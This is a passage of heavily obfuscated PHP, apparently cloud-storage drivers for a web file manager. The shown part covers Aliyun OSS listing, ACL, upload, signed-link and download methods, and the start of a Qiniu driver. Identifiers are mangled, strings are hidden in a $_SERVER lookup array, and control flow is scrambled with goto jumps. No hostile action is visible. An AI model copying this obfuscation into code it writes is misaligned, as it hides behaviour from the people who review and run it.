$this->fileList($FÑëÂò”ê, $C¿êÙ´—©Ñ[8], !0); foreach ($CÌñ¸›ßØô[$C¿êÙ´—©Ñ[75]] as $dİÜˆ‹í¶ => $dè×Ÿö÷¨ø) { $CÌñ¸›ßØô[$C¿êÙ´—©Ñ[75]][$dİÜˆ‹í¶] = $this->folderInfo($dè×Ÿö÷¨ø, $e­öéÌã¤ô, $dè×Ÿö÷¨ø); } foreach ($CÌñ¸›ßØô[$C¿êÙ´—©Ñ[74]] as $dİÜˆ‹í¶ => $dè×Ÿö÷¨ø) { $CÌñ¸›ßØô[$C¿êÙ´—©Ñ[74]][$dİÜˆ‹í¶] = $this->fileInfo($dè×Ÿö÷¨ø[$C¿êÙ´—©Ñ[28]], $e­öéÌã¤ô, $dè×Ÿö÷¨ø); } return $CÌñ¸›ßØô; } public function has($bÖ·¾ô˜›, $A²˜—Â…Ÿê = false, $f±ÜÕ„ğ±Ø = true) { goto fÃ´Ú»ãù£; fÃ´Ú»ãù£: $fÓŠİØã…‘ =& $_SERVER[æ§›¦ÌáØ]; $bÖ·¾ô˜› = trim($bÖ·¾ô˜›, $fÓŠİØã…‘[8]); $e†‹¶òµ¬ª = empty($bÖ·¾ô˜›) && $bÖ·¾ô˜› !== $fÓŠİØã…‘[191] ? $fÓŠİØã…‘[33] : $bÖ·¾ô˜› . $fÓŠİØã…‘[8]; goto d¢ÖÚæÏÛº; d¢ÖÚæÏÛº: $c©Ü·À¼÷’ = $fÓŠİØã…‘[33]; $bÊòˆ±¢Úƒ = 500; $FÙ³îÃ±Ïù = $d³ùÀäÂÉÚ = 0; goto dÕôæ’Ä¢á; dÕôæ’Ä¢á: while (!0) { check_abort(); $BÙù™¥í§Î = array($fÓŠİØã…‘[1261] => $fÓŠİØã…‘[8], $fÓŠİØã…‘[1262] => $e†‹¶òµ¬ª, $fÓŠİØã…‘[1263] => $bÊòˆ±¢Úƒ, $fÓŠİØã…‘[1264] => $c©Ü·À¼÷’); try { $bµÁİ…¾æ = $this->client->listObjects($this->bucket, $BÙù™¥í§Î); } catch (OSS\Core\OssException $aõìºÅ¼›Œ) { break; } $c©Ü·À¼÷’ = $bµÁİ…¾æ->getNextMarker(); $fÁîÜ”  = $bµÁİ…¾æ->getObjectList(); $dÙŠêƒØ = $bµÁİ…¾æ->getPrefixList(); if ($A²˜—Â…Ÿê) { if (count($fÁîÜ” ) > 1 || count($fÁîÜ” ) == 1 && $fÁîÜ” [0]->getKey() != $e†‹¶òµ¬ª) { $FÙ³îÃ±Ïù += count($fÁîÜ” ) - 1; } if (!empty($dÙŠêƒØ)) { $d³ùÀäÂÉÚ += count($dÙŠêƒØ); } if ($c©Ü·À¼÷’ === $fÓŠİØã…‘[33]) { break; } continue; } if ($f±ÜÕ„ğ±Ø) { if (!empty($fÁîÜ” )) { if (count($fÁîÜ” ) > 1 || $fÁîÜ” [0]->getKey() != $e†‹¶òµ¬ª) { return !0; } } } else { if (!empty($dÙŠêƒØ)) { return !0; } } if ($c©Ü·À¼÷’ === $fÓŠİØã…‘[33]) { break; } } if ($A²˜—Â…Ÿê) { return array($fÓŠİØã…‘[203] => $FÙ³îÃ±Ïù, $fÓŠİØã…‘[204] => $d³ùÀäÂÉÚ); } return !1; goto a¨ƒÙ³¼éÛ; a¨ƒÙ³¼éÛ: } public function listAll($a÷åêù†ŒÀ) { $b­¬’Å‰ŠÙ =& $_SERVER[æ§›¦ÌáØ]; $dƒÛƒ„ãñë = $this->fileList($a÷åêù†ŒÀ, $b­¬’Å‰ŠÙ[33], !0); $b¥…Ï³ñ‡¢ = array(); foreach ($dƒÛƒ„ãñë[$b­¬’Å‰ŠÙ[74]] as $bğ°®ÈÔÛÌ) { $b¥…Ï³ñ‡¢[$bğ°®ÈÔÛÌ[$b­¬’Å‰ŠÙ[28]]] = $bğ°®ÈÔÛÌ[$b­¬’Å‰ŠÙ[78]]; } foreach ($dƒÛƒ„ãñë[$b­¬’Å‰ŠÙ[75]] as $bğ°®ÈÔÛÌ) { if (is_string($bğ°®ÈÔÛÌ)) { $b¥…Ï³ñ‡¢[$bğ°®ÈÔÛÌ] = 0; } } return $this->listAllFiles($a÷åêù†ŒÀ, array_keys($b¥…Ï³ñ‡¢), $b¥…Ï³ñ‡¢); } public function canRead($bó¬ö‚Ÿ¡â) { $E¥İÉ§¢¯­ =& $_SERVER[æ§›¦ÌáØ]; $C™¶‡¦ö‘½ = $this->pathAcl($bó¬ö‚Ÿ¡â); return $C™¶‡¦ö‘½ == $E¥İÉ§¢¯­[1274] || $C™¶‡¦ö‘½ == $E¥İÉ§¢¯­[532] ? !0 : !1; } public function canWrite($b„‹ô÷À ·) { $EİÆ†´ˆßÓ = $this->pathAcl($b„‹ô÷À ·); return $EİÆ†´ˆßÓ == $_SERVER[æ§›¦ÌáØ][532] ? !0 : !1; } public function pathAcl($f­õŞ¼·Ø) { goto C‘°‚…Ğìñ; aêõ…ˆç¥…: return $E·‚Ş¥¹­Ù; goto Aõšš¤Á«ƒ; C‘°‚…Ğìñ: $Eò¦ÏŒœ‡ =& $_SERVER[æ§›¦ÌáØ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $C‘‡È´ñœ† = $this->client->getObjectAcl($this->bucket, $this->pathEncode($f­õŞ¼·Ø)); } catch (OSS\Core\OssException $B¯á‡êŞÚ) { return !1; } goto BÂÑİª¸½®; BÂÑİª¸½®: $E·‚Ş¥¹­Ù = $C‘‡È´ñœ† == $Eò¦ÏŒœ‡[34] ? $this->bucketAcl : $C‘‡È´ñœ†; if ($E·‚Ş¥¹­Ù == $Eò¦ÏŒœ‡[1275]) { return $Eò¦ÏŒœ‡[1274]; } if ($E·‚Ş¥¹­Ù == $Eò¦ÏŒœ‡[1276]) { return $Eò¦ÏŒœ‡[532]; } goto aêõ…ˆç¥…; Aõšš¤Á«ƒ: } private function chmodPath($cÜ“å½éÚ¡, $d¡äÜğª = '') { $fšø¸‘ğØ¢ =& $_SERVER[æ§›¦ÌáØ]; $fâšÜÈáÅ§ = empty($d¡äÜğª) ? $fšø¸‘ğØ¢[1276] : $d¡äÜğª; $eÎ Œ†ˆÀ = array($fšø¸‘ğØ¢[34], $fšø¸‘ğØ¢[192], $fšø¸‘ğØ¢[1275], $fšø¸‘ğØ¢[1276]); if (!in_array($fâšÜÈáÅ§, $eÎ Œ†ˆÀ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($cÜ“å½éÚ¡), $fâšÜÈáÅ§); } catch (OSS\Core\OssException $dçÇ×Š²Ó) { return !1; } return !0; } public function getContent($fÉß¼¡ŠÊ½) { return $this->fileSubstr($fÉß¼¡ŠÊ½, -1); } public function setContent($bØ•Œô×—, $A‡ù œöç = '') { $aèí„¡Šˆñ =& $_SERVER[æ§›¦ÌáØ]; try { $C…½Ãší£Ÿ = $this->trafficLimit($aèí„¡Šˆñ[1277]); $dÚô‡Ğ‘‡‘ = $this->client->putObject($this->bucket, $this->pathEncode($bØ•Œô×—), $A‡ù œöç, $C…½Ãší£Ÿ); } catch (OSS\Core\OssException $b«áÛö©¬ó) { return !1; } $FŒ»í’‰ = array($aèí„¡Šˆñ[1267] => trim($dÚô‡Ğ‘‡‘[$aèí„¡Šˆñ[1278]], $aèí„¡Šˆñ[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($bØ•Œô×—))); $this->updateObjMeta($bØ•Œô×—, $FŒ»í’‰); return isset($dÚô‡Ğ‘‡‘[$aèí„¡Šˆñ[1279]][$aèí„¡Šˆñ[1226]]) ? !0 : !1; } private function updateObjMeta($fêãèíğ±®, $dŞÕ²œŠÜ£) { $fêãèíğ±® = $this->pathEncode($fêãèíğ±®); try { $fØµÁÍñ¶¸ = array(OSS\OssClient::OSS_HEADERS => $dŞÕ²œŠÜ£); $this->client->copyObject($this->bucket, $fêãèíğ±®, $this->bucket, $fêãèíğ±®, $fØµÁÍñ¶¸); } catch (OSS\Core\OssException $e¤İ¹—¡”) { return !1; } return !0; } public function upload($aÓ†Ü¬À, $DÕêùÌêæƒ, $eì¹Ğ¦µˆÆ = false, $bŞğÅ‰ÉĞ = REPEAT_REPLACE) { $b õ´–°® =& $_SERVER[æ§›¦ÌáØ]; $a‰¸¿âÊ = trim($aÓ†Ü¬À, $b õ´–°®[8]); $d”öÆŒŠ½ã = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($b õ´–°®[1267] => @md5_file($DÕêùÌêæƒ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($aÓ†Ü¬À))); $d”öÆŒŠ½ã = $this->trafficLimit($b õ´–°®[1277], $d”öÆŒŠ½ã); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($a‰¸¿âÊ), $DÕêùÌêæƒ, $d”öÆŒŠ½ã); } catch (OSS\Core\OssException $AÔ¼Ã‘) { return !1; } return $this->getPathOuter($aÓ†Ü¬À); } public function getHost() { $B”—“Ñå·Ô =& $_SERVER[æ§›¦ÌáØ]; $b­ÚÍ‘È§ = explode($B”—“Ñå·Ô[177], parent::getHost()); return $b­ÚÍ‘È§[0] . $B”—“Ñå·Ô[177] . $this->bucket . $B”—“Ñå·Ô[95] . $b­ÚÍ‘È§[1]; } public function uploadFormData($e¢èàÃÄ‹®, $E‰¶•Öå— = 3600) { goto F°—¥²©Æ; EÔ†’÷µæ™: $dÄ¿¢Œ°× = base64_encode(hash_hmac($DõŸÛİ‹Ìæ[230], $D—‡ÀÉ—, $this->secret, !0)); $fê´ùØØÉ¹ = array($DõŸÛİ‹Ìæ[1191] => $D—‡ÀÉ—, $DõŸÛİ‹Ìæ[1283] => $this->accessKey, $DõŸÛİ‹Ìæ[1187] => $DõŸÛİ‹Ìæ[1179], $DõŸÛİ‹Ìæ[1284] => $dÄ¿¢Œ°×, $DõŸÛİ‹Ìæ[175] => $FÚ× Ç°­³); $fê´ùØØÉ¹ = $this->trafficLimit($DõŸÛİ‹Ìæ[1277], $fê´ùØØÉ¹); goto d¾Ç¡¸Ì§Ş; F°—¥²©Æ: $DõŸÛİ‹Ìæ =& $_SERVER[æ§›¦ÌáØ]; if (!($FÚ× Ç°­³ = $this->getHost())) { return !1; } $C·Ä†ÔÛâÎ = $E‰¶•Öå—; goto f§Üæ‡‚À‹; d¾Ç¡¸Ì§Ş: return $fê´ùØØÉ¹; goto A§‡«ó™‰; f§Üæ‡‚À‹: $d‹äŸºö±Å = date($DõŸÛİ‹Ìæ[1280], time() + $C·Ä†ÔÛâÎ); $A†ÊÀŒ©Ãİ = new DateTime($d‹äŸºö±Å); $A±èö·õ”ò = $A†ÊÀŒ©Ãİ->format(DateTime::ISO8601); goto eè Ô¨¡Ûí; c‰¦¤‘¢¤é: $d‘Ç‘îóä = $this->pathFather($e¢èàÃÄ‹®); $Cšãá†¿– = array($DõŸÛİ‹Ìæ[1181] => $A±èö·õ”ò, $DõŸÛİ‹Ìæ[1182] => array(array($DõŸÛİ‹Ìæ[1282], 0, $eÁÌöº¶šå), array($DõŸÛİ‹Ìæ[1185], $DõŸÛİ‹Ìæ[1186], $d‘Ç‘îóä))); $D—‡ÀÉ— = base64_encode(json_encode($Cšãá†¿–)); goto EÔ†’÷µæ™; eè Ô¨¡Ûí: $fºé÷õ‚  = strpos($A±èö·õ”ò, $DõŸÛİ‹Ìæ[294]); $A±èö·õ”ò = substr($A±èö·õ”ò, 0, $fºé÷õ‚ ) . $DõŸÛİ‹Ìæ[1281]; $eÁÌöº¶šå = 1048576000 * 5; goto c‰¦¤‘¢¤é; A§‡«ó™‰: } public function multiUploadFormData($A¦öêƒ¼‡—, $CÊí¹®Í†Š = 3600) { $aâîÂ²± =& $_SERVER[æ§›¦ÌáØ]; if (!($dƒ²½½ÍÓ˜ = $this->getHost())) { return !1; } $B³»¡©¬›ƒ = $this->trafficLimit($aâîÂ²±[1277]); $a¥›¤¬Æˆí = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($A¦öêƒ¼‡—), $B³»¡©¬›ƒ); return array($aâîÂ²±[221] => $a¥›¤¬Æˆí, $aâîÂ²±[175] => $dƒ²½½ÍÓ˜ . $aâîÂ²±[8] . $this->pathEncode($A¦öêƒ¼‡—), $aâîÂ²±[222] => gmdate($aâîÂ²±[1285]), $aâîÂ²±[93] => $A¦öêƒ¼‡—); } public function multiUploadAuthData($CÛë®Ó™„‰, $d¿°ê®£Ñ = array()) { goto bÀÈˆñ²²É; CêîÃËòğ²: if (!empty($d¿°ê®£Ñ[$B÷“£Ê–[1287]])) { $dñŠ¦ßˆó¡ = array_merge(array($BƒÄÂ ¿¹µ[4]), $d¿°ê®£Ñ[$B÷“£Ê–[1287]]); sort($dñŠ¦ßˆó¡); $BƒÄÂ ¿¹µ[4] = implode($B÷“£Ê–[229], $dñŠ¦ßˆó¡); } $eã‰­á¤â‡ = implode($B÷“£Ê–[229], $BƒÄÂ ¿¹µ); $dâÇäÜ¬ã = base64_encode(hash_hmac($B÷“£Ê–[230], $eã‰­á¤â‡, $this->secret, !0)); goto f¾¾·›Óâ; f¾¾·›Óâ: $c‹àÎ°±ù = $B÷“£Ê–[1251] . $this->accessKey . $B÷“£Ê–[4] . $dâÇäÜ¬ã; if (strpos($CÕµëíØ›Ü, $B÷“£Ê–[225]) === 0) { $c‹àÎ°±ù = array($B÷“£Ê–[232] => $c‹àÎ°±ù, $B÷“£Ê–[222] => $E‹øÄéâ½Ø); if ($B»¡—˜İ÷·) { $c‹àÎ°±ù = array_merge($c‹àÎ°±ù, $B»¡—˜İ÷·); } } return $c‹àÎ°±ù; goto Fà•ÓòçŠ; bòô‚Âà: $Cˆğµ‘Å¥ğ = $CÛë®Ó™„‰; if (isset($d¿°ê®£Ñ[$B÷“£Ê–[93]])) { $Cˆğµ‘Å¥ğ = $d¿°ê®£Ñ[$B÷“£Ê–[93]]; unset($d¿°ê®£Ñ[$B÷“£Ê–[93]]); } if (isset($d¿°ê®£Ñ[$B÷“£Ê–[223]])) { $d¿°ê®£Ñ[$B÷“£Ê–[222]] = $E‹øÄéâ½Ø; return $this->listUploadParts($Cˆğµ‘Å¥ğ, $d¿°ê®£Ñ); } goto c¶ğ¶¡†Á; bÀÈˆñ²²É: $B÷“£Ê– =& $_SERVER[æ§›¦ÌáØ]; $E‹øÄéâ½Ø = isset($d¿°ê®£Ñ[$B÷“£Ê–[222]]) ? $d¿°ê®£Ñ[$B÷“£Ê–[222]] : gmdate($B÷“£Ê–[1285]); $CÕµëíØ›Ü = isset($d¿°ê®£Ñ[$B÷“£Ê–[168]]) ? $d¿°ê®£Ñ[$B÷“£Ê–[168]] : $B÷“£Ê–[33]; goto bòô‚Âà; c¶ğ¶¡†Á: $BƒÄÂ ¿¹µ = array($B÷“£Ê–[224], $B÷“£Ê–[33], $B÷“£Ê–[119], $E‹øÄéâ½Ø, "\x78\55\157\x73\163\55\x64\141\164\x65\x3a{$E‹øÄéâ½Ø}", $B÷“£Ê–[8] . $this->bucket . $B÷“£Ê–[8] . $Cˆğµ‘Å¥ğ . $CÕµëíØ›Ü); if (strpos($CÕµëíØ›Ü, $B÷“£Ê–[225]) === 0) { $BƒÄÂ ¿¹µ[0] = $B÷“£Ê–[226]; if ($B»¡—˜İ÷· = $this->trafficLimit($B÷“£Ê–[1277])) { $Cˆğµ‘Å¥ğ = $B÷“£Ê–[1286]; array_splice($BƒÄÂ ¿¹µ, 5, 0, $Cˆğµ‘Å¥ğ . $B÷“£Ê–[4] . $B»¡—˜İ÷·[$Cˆğµ‘Å¥ğ]); } } if (isset($d¿°ê®£Ñ[$B÷“£Ê–[227]]) && $d¿°ê®£Ñ[$B÷“£Ê–[227]] == $B÷“£Ê–[228]) { $BƒÄÂ ¿¹µ[0] = $B÷“£Ê–[228]; } goto CêîÃËòğ²; Fà•ÓòçŠ: } public function listUploadParts($e‹èéğ’, $F“Ö„Úæ²Ê) { goto AËíÇåìÆ; aÉº…¹—£: $C·å°µÆÆÓ = $F¦‡ĞÙ”->getListPart(); $AöÄé†¥‡† = array(); foreach ($C·å°µÆÆÓ as $dó°Õ‰‘«) { $AöÄé†¥‡†[] = array($Añ¯Çµ°šÏ[1271] => $dó°Õ‰‘«->getPartNumber(), $Añ¯Çµ°šÏ[1272] => trim($dó°Õ‰‘«->getETag(), $Añ¯Çµ°šÏ[116])); } goto C‚âäøºäÈ; a÷ÇŒ‘Ãµ°: return array($Añ¯Çµ°šÏ[232] => $aÑä¬ùªÅà, $Añ¯Çµ°šÏ[222] => $F“Ö„Úæ²Ê[$Añ¯Çµ°šÏ[222]], $Añ¯Çµ°šÏ[234] => $AöÄé†¥‡†); goto DğŠ¨ì—ÃÔ; C‚âäøºäÈ: unset($F“Ö„Úæ²Ê[$Añ¯Çµ°šÏ[223]], $F“Ö„Úæ²Ê[$Añ¯Çµ°šÏ[227]]); $aÑä¬ùªÅà = $this->multiUploadAuthData($e‹èéğ’, $F“Ö„Úæ²Ê); if (empty($aÑä¬ùªÅà)) { return !1; } goto a÷ÇŒ‘Ãµ°; AËíÇåìÆ: $Añ¯Çµ°šÏ =& $_SERVER[æ§›¦ÌáØ]; $Bù±§Ûì = parse_url_query($F“Ö„Úæ²Ê[$Añ¯Çµ°šÏ[168]]); $F¦‡ĞÙ” = $this->client->listParts($this->bucket, $this->pathEncode($e‹èéğ’), $Bù±§Ûì[$Añ¯Çµ°šÏ[221]]); goto aÉº…¹—£; DğŠ¨ì—ÃÔ: } public function download($F±ëÄÁç¿¶, $e©»™ƒ­­) { if ($this->isFolder($F±ëÄÁç¿¶)) { return !1; } try { $cÓĞÀÇˆƒ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $e©»™ƒ­­); $cÓĞÀÇˆƒ = $this->trafficLimit($_SERVER[æ§›¦ÌáØ][109], $cÓĞÀÇˆƒ); $this->client->getObject($this->bucket, $this->pathEncode($F±ëÄÁç¿¶), $cÓĞÀÇˆƒ); } catch (OSS\Core\OssException $b”öœ†áè¿) { return !1; } return $e©»™ƒ­­; } public function fileSubstr($DŞöÛöÙŠ¿, $e¦ªØì‘Ó‘ = 0, $Bèš¤„è÷ = false) { if ($e¦ªØì‘Ó‘ === -1) { $cÂ•£ê¥‡ = array(); } else { if ($Bèš¤„è÷ === !1) { $b“Ù»¥¹Ï© = $this->size($DŞöÛöÙŠ¿); } else { $b“Ù»¥¹Ï© = $e¦ªØì‘Ó‘ + $Bèš¤„è÷ - 1; } $cÂ•£ê¥‡ = array(OSS\OssClient::OSS_RANGE => "{$e¦ªØì‘Ó‘}\55{$b“Ù»¥¹Ï©}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($DŞöÛöÙŠ¿), $cÂ•£ê¥‡); } catch (OSS\Core\OssException $Aàìì¯ƒÕ…) { think_exception($Aàìì¯ƒÕ…->getMessage()); return !1; } } private function trafficLimit($f‰á›©ÎĞ, $FÜã¹ ¬ÈŸ = array()) { goto eÍ‹¼îß; F¢‹òÍÃšŞ: return $FÜã¹ ¬ÈŸ; goto C—ÄÙóÓ‚…; FÌÙİ©¿ °: if (!$Bºä—ŠŠŠ’) { return $FÜã¹ ¬ÈŸ; } $Bºä—ŠŠŠ’ = $Bºä—ŠŠŠ’ < 819200 ? 819200 : ($Bºä—ŠŠŠ’ > 838860800 ? 838860800 : $Bºä—ŠŠŠ’); $FÜã¹ ¬ÈŸ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Bºä—ŠŠŠ’); goto F¢‹òÍÃšŞ; eÍ‹¼îß: $døö…èØèª =& $_SERVER[æ§›¦ÌáØ]; if ($f‰á›©ÎĞ == $døö…èØèª[1277] && $this->isUploadServer() || $f‰á›©ÎĞ == $døö…èØèª[109] && $this->isFileOutServer()) { return $FÜã¹ ¬ÈŸ; } $Bºä—ŠŠŠ’ = floatval($GLOBALS[$døö…èØèª[6]][$døö…èØèª[88]][$døö…èØèª[107]][$f‰á›©ÎĞ]) * 1024 * 1024 * 8; goto FÌÙİ©¿ °; C—ÄÙóÓ‚…: } public function link($FïŸ²­Şô†, $DôÏ”·Ñò° = array()) { $AØà°ÃÀö³ =& $_SERVER[æ§›¦ÌáØ]; if (!$this->exist($FïŸ²­Şô†) || $this->isFolder($FïŸ²­Şô†)) { return !1; } try { $DôÏ”·Ñò° = $this->trafficLimit($AØà°ÃÀö³[109], $DôÏ”·Ñò°); $DğŞø–œÇ = $this->client->signUrl($this->bucket, $this->pathEncode($FïŸ²­Şô†), 3600 * 12, $AØà°ÃÀö³[228], $DôÏ”·Ñò°); return $this->getCdnLink($DğŞø–œÇ); } catch (OSS\Core\OssException $DÁ›Œ˜”´) { return !1; } } public function fileOut($e²”öŒÈïƒ, $CÈÈ²ˆ©Í× = false, $D¥ìµ²¼Óö = false, $Bšò”¶®¡ = '') { goto D´Ñ©Êááõ; e«Ç¬¿± £: $D¥ìµ²¼Óö = rawurlencode($D¥ìµ²¼Óö); $b­Ïó¹²–î = get_file_mime(get_path_ext($D¥ìµ²¼Óö)); if ($b­Ïó¹²–î == $d˜ëá†Ìâ[213]) { return parent::fileOut($e²”öŒÈïƒ, $CÈÈ²ˆ©Í×, $D¥ìµ²¼Óö, $Bšò”¶®¡); } goto C…ò§õÀ©’; D´Ñ©Êááõ: $d˜ëá†Ìâ =& $_SERVER[æ§›¦ÌáØ]; if ($this->isFileOutServer()) { return $this->fileOutServer($e²”öŒÈïƒ, $CÈÈ²ˆ©Í×, $D¥ìµ²¼Óö, $Bšò”¶®¡); } if (!$D¥ìµ²¼Óö) { $D¥ìµ²¼Óö = $this->pathThis($e²”öŒÈïƒ); } goto e«Ç¬¿± £; bÜ³Æ­ùµ: $d›‘‘†¥ = $this->link($e²”öŒÈïƒ, $FÊšŠÉ«…­); $this->fileOutLink($d›‘‘†¥); goto bÒóŠ÷¤³‚; C…ò§õÀ©’: $CÈÈ²ˆ©Í× = $CÈÈ²ˆ©Í× ? $d˜ëá†Ìâ[214] : $d˜ëá†Ìâ[215]; $FÊšŠÉ«…­ = array(OSS\OssClient::OSS_SUB_RESOURCE => $d˜ëá†Ìâ[1288] . rawurlencode("{$CÈÈ²ˆ©Í×}\x3b\x66\151\x6c\x65\156\141\x6d\145\75{$D¥ìµ²¼Óö}")); $FÊšŠÉ«…­[OSS\OssClient::OSS_SUB_RESOURCE] .= $d˜ëá†Ìâ[1289] . rawurlencode($b­Ïó¹²–î); goto bÜ³Æ­ùµ; bÒóŠ÷¤³‚: } public function fileOutServer($aÜéÍÂ¶ĞŠ, $c’Ø°¯ƒÍÁ = false, $B¯ŒåŠÉ÷ = false, $dÊ¿…–¯Œ = '') { parent::fileOut($aÜéÍÂ¶ĞŠ, $c’Ø°¯ƒÍÁ, $B¯ŒåŠÉ÷, $dÊ¿…–¯Œ); } public function fileOutImage($aÖ‹ÀŠß£«, $EˆÓÀš˜¨¨ = 250) { $aáÜÛ‰¦Ãä = array(OSS\OssClient::OSS_PROCESS => $_SERVER[æ§›¦ÌáØ][1290] . $EˆÓÀš˜¨¨); $A§‹‹Ñ»ñ´ = $this->link($aÖ‹ÀŠß£«, $aáÜÛ‰¦Ãä); $this->fileOutLink($A§‹‹Ñ»ñ´); } public function fileOutImageServer($F±—ÉµÃÓ, $BæŞæáó = 250) { parent::fileOutImage($F±—ÉµÃÓ, $BæŞæáó); } public function fileOutLink($CĞÈ‰Ü‰­¬) { $F¦àğÂÆ¸Ô =& $_SERVER[æ§›¦ÌáØ]; if (!$this->isCdnHost() && substr($CĞÈ‰Ü‰­¬, 0, 7) == $F¦àğÂÆ¸Ô[1194]) { $CĞÈ‰Ü‰­¬ = $F¦àğÂÆ¸Ô[1195] . substr($CĞÈ‰Ü‰­¬, 7); } header($F¦àğÂÆ¸Ô[159] . $CĞÈ‰Ü‰­¬); die; } public function hashMd5($bô§ğº‚åŞ, $fî‹À×‚¥¼ = '') { $EâÂÉ¶ñİ =& $_SERVER[æ§›¦ÌáØ]; $B˜Š‘Ì³Ó‚ = $this->_objectMeta($bô§ğº‚åŞ); if (!$B˜Š‘Ì³Ó‚) { return $EâÂÉ¶ñİ[33]; } if (!isset($B˜Š‘Ì³Ó‚[$EâÂÉ¶ñİ[1267]]) && !empty($fî‹À×‚¥¼)) { $BÀÎ‡Î©ê¤ = $this->updateObjMeta($bô§ğº‚åŞ, array($EâÂÉ¶ñİ[1267] => $fî‹À×‚¥¼)); $B˜Š‘Ì³Ó‚[$EâÂÉ¶ñİ[1267]] = $BÀÎ‡Î©ê¤ ? $fî‹À×‚¥¼ : $EâÂÉ¶ñİ[33]; } return isset($B˜Š‘Ì³Ó‚[$EâÂÉ¶ñİ[1267]]) ? strtolower($B˜Š‘Ì³Ó‚[$EâÂÉ¶ñİ[1267]]) : $EâÂÉ¶ñİ[33]; } public function size($BÂ¸ÂÈŸ¸Ã) { $aÇÑ¸˜™×â = $this->objectMeta($BÂ¸ÂÈŸ¸Ã); return $aÇÑ¸˜™×â ? $aÇÑ¸˜™×â[$_SERVER[æ§›¦ÌáØ][78]] : 0; } public function info($B÷ÛçºØ×) { if ($this->isFolder($B÷ÛçºØ×)) { return $this->folderInfo($B÷ÛçºØ×); } else { if ($this->isFile($B÷ÛçºØ×)) { return $this->fileInfo($B÷ÛçºØ×); } } return !1; } public function exist($aù·ˆ»á Ä) { return $this->isFile($aù·ˆ»á Ä) || $this->isFolder($aù·ˆ»á Ä); } public function isFile($CÛ÷İÒ¬§) { return !$this->isFolder($CÛ÷İÒ¬§) && $this->objectMeta($CÛ÷İÒ¬§); } public function isFolder($E¹Éµó¶ ¦) { return $this->cacheMethod($_SERVER[æ§›¦ÌáØ][199], $E¹Éµó¶ ¦); } protected function objectMeta($f¡ùß«Æ) { return $this->cacheMethod($_SERVER[æ§›¦ÌáØ][200], $f¡ùß«Æ); } protected function _objectMeta($Fƒ® ‹ÃÂ) { $få”å•™îÛ =& $_SERVER[æ§›¦ÌáØ]; try { $E—§ÁÂøÕæ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Fƒ® ‹ÃÂ)); } catch (OSS\Core\OssException $C®ì¥˜½ˆ) { $E—§ÁÂøÕæ = !1; } if ($E—§ÁÂøÕæ) { $E—§ÁÂøÕæ[$få”å•™îÛ[78]] = intval($E—§ÁÂøÕæ[$få”å•™îÛ[1265]]); } return $E—§ÁÂøÕæ; } protected function _isFolder($bÍˆÀÏ‹¯´) { $bˆÄ¿°Öà’ =& $_SERVER[æ§›¦ÌáØ]; if ($bÍˆÀÏ‹¯´ == $bˆÄ¿°Öà’[33] || $bÍˆÀÏ‹¯´ == $bˆÄ¿°Öà’[8]) { return !0; } $B×›×ô¾ˆº = array($bˆÄ¿°Öà’[1261] => $bˆÄ¿°Öà’[8], $bˆÄ¿°Öà’[1262] => rtrim($bÍˆÀÏ‹¯´, $bˆÄ¿°Öà’[8]) . $bˆÄ¿°Öà’[8], $bˆÄ¿°Öà’[1263] => 1, $bˆÄ¿°Öà’[1264] => $bˆÄ¿°Öà’[33]); $F§ÔÛ—ŒºÈ = $this->client->listObjects($this->bucket, $B×›×ô¾ˆº); if ($F§ÔÛ—ŒºÈ->getObjectList() || $F§ÔÛ—ŒºÈ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($Bèù“ÅÃ‚Ü) { parent::__construct(); require_once SDK_DIR . $_SERVER[æ§›¦ÌáØ][1291]; $this->_init($Bèù“ÅÃ‚Ü); } public function _init($aè¨Äêô³) { goto A‡Ü§Ÿ®”; A‡Ü§Ÿ®”: $fÆÖ™ ä½¯ =& $_SERVER[æ§›¦ÌáØ]; foreach ($aè¨Äêô³ as $fÚ‘¿À‡Ù => $B¹ˆ½Áº—á) { if (isset($this->{$fÚ‘¿À‡Ù})) { $this->{$fÚ‘¿À‡Ù} = $B¹ˆ½Áº—á; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($fÆÖ™ ä½¯[1292] . LNG($fÆÖ™ ä½¯[1252])); } goto C×²ÄÖªÅÄ; Aªòƒ’ºâ‚: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto AæÒåÂ¨¸¬; C×²ÄÖªÅÄ: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto Aªòƒ’ºâ‚; AæÒåÂ¨¸¬: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($EÉ—ÒÓ¿Ñ, $bƒÙˆ¤Ù« = '', $f•«½Ø¿ì = REPEAT_RENAME) { if ($this->setContent($EÉ—ÒÓ¿Ñ, $bƒÙˆ¤Ù«)) { return $this->getPathOuter($EÉ—ÒÓ¿Ñ); } return !1; } public function mkdir($DµÃ’ĞŸË¬, $Eâöçë©‡ = REPEAT_SKIP) { goto Cê‘É õöâ; Cê‘É õöâ: $b·ÓµÎÊá› =& $_SERVER[æ§›¦ÌáØ]; $EÉáß‚ƒ‡ = trim($DµÃ’ĞŸË¬, $b·ÓµÎÊá›[8]); if ($this->_isFolder($EÉáß‚ƒ‡)) { return $this->getPathOuter($EÉáß‚ƒ‡); } goto BÜ…ê‚¡‹æ; BÜ…ê‚¡‹æ: $DµÃ’ĞŸË¬ = $EÉáß‚ƒ‡ . $b·ÓµÎÊá›[8]; $E…ÜÜğ†Ê™ = 